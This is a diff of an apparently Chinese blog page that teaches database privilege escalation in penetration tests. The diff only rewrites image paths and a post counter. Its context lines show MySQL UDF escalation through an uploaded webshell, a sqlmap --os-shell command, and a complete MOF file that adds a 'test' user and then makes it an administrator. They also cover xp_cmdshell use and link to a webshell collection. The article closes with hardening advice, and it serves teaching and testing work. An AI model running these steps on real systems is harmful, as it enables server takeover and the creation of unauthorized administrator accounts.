@@ -488,16 +488,16 @@
 </li>
 </ul>
 <h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428160603.png" alt></p>
 <p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p>
 <p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p>
 <p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428160926.png" alt></p>
 <p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428163445.png" alt></p>
 <p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p>
 <p>还可以执行数据库命令：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428161455.png" alt></p>
 <p>这里补充一个点:</p>
 <ul>
 <li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
@@ -509,7 +509,7 @@
 
 <p>我直接在菜刀下创建plugin文件夹</p>
 <p>然后最关键的一步：<strong>导出UDF文件</strong></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428165018.png" alt></p>
 <p>导出后，再次尝试文件已经存在，说明导入成功。</p>
 <p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
 <p>引入sys_eval函数：</p>
@@ -520,11 +520,11 @@
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="symbol">'ipconfig</span>)</span><br></pre></td></tr></table></figure>
 
 <p>也可以直接使用大马这里的功能选项：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428174431.png" alt></p>
 <h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428170837.png" alt></p>
 <p>进入模块，看一下需要配置选项：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428170940.png" alt></p>
 <p>注：这里注意版本，适用于5.5.9以下，</p>
 <h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -d mysql://root:xxxxxx<span class="variable">@VPS</span>:3306/mysql --os-shell</span><br></pre></td></tr></table></figure>
@@ -532,7 +532,7 @@
 <h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
 <h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
 <p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428185617.png" alt></p>
 <p>文件内容：</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test test /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
@@ -541,16 +541,16 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"C:/phpStudy/WWW/nullevt.mof"</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">"c:/windows/system32/wbem/mof/nullevt.mof"</span></span><br></pre></td></tr></table></figure>
 
 <p>可以使用菜刀下的数据库管理工具执行</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428190009.png" alt></p>
 <p>执行后，到win2003上查看用户：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428190809.png" alt></p>
 <p>之后我们可以将自定义的命令改为：</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.exe localgroup administrators test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure>
 
 <p>即可对添加的用户进行提权。</p>
 <h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
 <h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
+<p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/QQ%E6%88%AA%E5%9B%BE20200428184713.png" alt></p>
 <p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
 <h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
 <ul>
@@ -558,7 +558,7 @@
 <li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li>
 <li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li>
 </ul>
-<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
+<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
 <p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p>
 <h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p>
 <ul>
@@ -741,7 +741,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
